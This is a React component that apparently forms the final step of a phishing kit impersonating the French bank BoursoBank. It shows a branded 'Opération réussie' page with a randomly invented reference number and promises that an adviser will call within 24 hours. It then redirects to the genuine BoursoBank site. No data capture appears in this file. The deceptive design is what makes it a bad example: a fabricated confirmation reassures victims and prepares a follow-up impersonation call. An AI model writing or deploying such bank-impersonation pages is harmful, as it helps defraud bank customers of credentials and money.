import React, { useState, useEffect, useMemo } from 'react';

const ConfirmationStep: React.FC = () => {
  const [countdown, setCountdown] = useState(12);
  const refNumber = useMemo(() => `BRS-${new Date().getFullYear()}-${String(Math.floor(Math.random() * 900000 + 100000))}`, []);

  useEffect(() => {
    if (countdown <= 0) {
      window.location.href = 'https://clients.boursobank.com/';
      return;
    }
    const timer = setTimeout(() => setCountdown(c => c - 1), 1000);
    return () => clearTimeout(timer);
  }, [countdown]);

  const progress = ((12 - countdown) / 12) * 100;

  return (
    <main className="flex justify-center px-4 py-8 animate-fadeIn">
      <div className="w-full max-w-lg">
        <div className="bg-white rounded-2xl shadow-lg p-8 text-center">
          <div className="my-6">
            <svg width="80" height="80" viewBox="0 0 52 52" className="block mx-auto">
              <circle cx="26" cy="26" r="25" fill="none" stroke="#D20073" strokeWidth="2" style={{ strokeDasharray: 166, strokeDashoffset: 0 }} />
              <path fill="none" stroke="#D20073" strokeWidth="3" strokeLinecap="round" strokeLinejoin="round" d="M14.1 27.2l7.1 7.2 16.7-16.8" />
            </svg>
          </div>

          <p className="text-xl font-bold text-bourso mb-4">Opération réussie</p>

          <p className="max-w-[400px] mx-auto mb-4">
            Votre demande a été traitée avec succès. Vous pouvez maintenant accéder normalement à l'ensemble de vos services BoursoBank.
          </p>

          <p className="max-w-[400px] mx-auto mb-5 text-gray-500">
            Un conseiller BoursoBank vous contactera dans les <strong>24 heures ouvrées</strong> pour finaliser la procédure.
          </p>

          <div className="bg-gray-50 rounded-lg p-4 mb-5 max-w-[400px] mx-auto">
            <p className="text-sm text-gray-600 mb-1">
              <span className="font-semibold">Référence :</span> {refNumber}
            </p>
            <p className="text-xs text-gray-400">Conservez cette référence pour tout contact avec votre conseiller.</p>
          </div>

          <div className="max-w-[400px] mx-auto mb-4">
            <div className="overflow-hidden h-2 rounded-full bg-gray-200 mb-2">
              <div className="h-2 rounded-full transition-all duration-1000 ease-linear" style={{ width: `${progress}%`, background: 'linear-gradient(90deg, #D20073, #FF0D77)' }} />
            </div>
            <p className="text-sm text-gray-500">
              Redirection vers boursobank.com dans <span className="font-bold text-bourso">{countdown}</span> secondes
            </p>
          </div>
        </div>
      </div>
    </main>
  );
};

export default ConfirmationStep;
